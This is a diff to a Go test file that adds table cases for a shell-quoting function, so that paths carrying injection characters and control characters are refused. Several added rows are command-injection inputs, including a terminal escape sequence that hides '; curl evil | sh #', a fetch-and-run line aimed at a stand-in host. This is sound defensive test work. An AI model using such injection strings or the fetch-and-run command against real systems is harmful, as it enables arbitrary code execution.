@@ -1769,7 +1769,9 @@ func TestIsPlanningRepoMirror(t *testing.T) {
 // at a curly quote; cmd.exe expands %name% and !name! and ends the command at
 // a line break, and acts on & | < > ^ in an argument PowerShell hands a .cmd
 // shim unquoted; bash collapses \\ to one; and Go reads a trailing backslash as
-// escaping the closing quote. On a POSIX host each printed form is also run
+// escaping the closing quote. Each Windows character is refused by a row of
+// its own. On both, a control character is refused: it ends the command, or
+// redraws the printed one in the terminal so a different command is copied. On a POSIX host each printed form is also run
 // through a shell, which must pass the value on unchanged: sh for the POSIX
 // forms, and bash, as Git Bash on Windows runs them, for the Windows forms.
 func TestShellQuotedFor(t *testing.T) {
@@ -1780,12 +1782,23 @@ func TestShellQuotedFor(t *testing.T) {
 		{"linux", "/home/me/.beads-planning", `'/home/me/.beads-planning'`},
 		{"darwin", "/tmp/$HOME/it's `id`", `'/tmp/$HOME/it'\''s ` + "`id`'"},
 		{"linux", `x" & calc & "$(calc)`, `'x" & calc & "$(calc)'`},
-		{"linux", "db\ncalc", "'db\ncalc'"},
+		{"linux", "db\ncalc", ""},
+		{"linux", "\x1b[2K\rbd init --server-host db; curl evil | sh #", ""},
+		{"darwin", "db\u009bx", ""},
 		{"linux", `x\'; calc #`, ""},
 		{"windows", `C:\Users\me\.beads-planning`, `"C:\Users\me\.beads-planning"`},
 		{"windows", `C:\Users\Jane Doe\Proj (x86); it's #1 @home ~a +b =c ,d [e] {f}`, `"C:\Users\Jane Doe\Proj (x86); it's #1 @home ~a +b =c ,d [e] {f}"`},
 		{"windows", "db.example.com; calc", `"db.example.com; calc"`},
 		{"windows", `x" & calc & "`, ""},
+		{"windows", `x";calc;#`, ""},
+		{"windows", "db\u201ex", ""},
+		{"windows", "db\u201cx", ""},
+		{"windows", "db\u201dx", ""},
+		{"windows", "db|calc", ""},
+		{"windows", "db<x", ""},
+		{"windows", "db>x", ""},
+		{"windows", "db^x", ""},
+		{"windows", "\x1b[2K\rbd init", ""},
 		{"windows", "$(calc)", ""},
 		{"windows", `C:\Users\me\$work\planning`, ""},
 		{"windows", "C:\\Users\\me\\`tplanning", ""},
